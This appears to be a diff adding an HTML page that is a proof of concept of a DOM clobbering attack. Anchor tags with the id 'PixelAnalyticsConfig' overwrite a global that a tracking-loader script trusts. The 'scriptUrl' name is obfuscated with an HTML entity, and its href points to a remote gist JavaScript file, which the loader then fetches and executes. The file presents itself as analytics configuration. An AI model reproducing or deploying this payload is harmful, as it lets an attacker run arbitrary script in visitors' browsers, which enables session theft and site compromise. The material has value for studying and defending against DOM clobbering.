@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   
+</head>
+<body class="crt">
+
+
+	<a id=PixelAnalyticsConfig name=enabled href=true>	
+	<a id=PixelAnalyticsConfig name=scr&#105ptUrl href=https://gist.githubusercontent.com/sreenivasappachula/3f0ada2d284293f1af994293ef43466a/raw/8740c301610aa6549a2935447ce830514ccb5487/test.js>
+
+</body>
+</html>
+
+
+	
+
+<script>
+
+let config = window.PixelAnalyticsConfig || { enabled: false, scriptUrl: '/js/mock-tracker.js' };
+    if (config.enabled) {
+        console.log("Loading tracking script from:", config.scriptUrl);
+        let s = document.createElement('script');
+        s.src = config.scriptUrl;
+        document.body.appendChild(s);
+    }
+</script>
